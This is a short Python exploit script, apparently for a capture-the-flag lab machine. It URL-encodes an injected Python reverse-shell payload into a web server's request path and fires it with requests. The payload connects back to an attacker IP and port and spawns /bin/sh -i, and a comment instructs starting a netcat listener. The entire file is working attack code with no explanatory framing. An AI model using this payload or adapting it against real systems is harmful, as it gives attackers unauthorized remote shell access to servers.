import requests
import urllib
import os

url='http://10.10.10.168:8080/' 
lhost = '10.10.14.8' #change this
lport = '1234' 
#make sure to set up a listener nc -lnvp 1234

path='\';import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'+lhost+'",'+lport+'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''

print('shellcode\n')

payload=urllib.parse.quote(path)
print(url+payload)

resp=requests.get(url+payload)
print(resp.headers)
print(resp.text)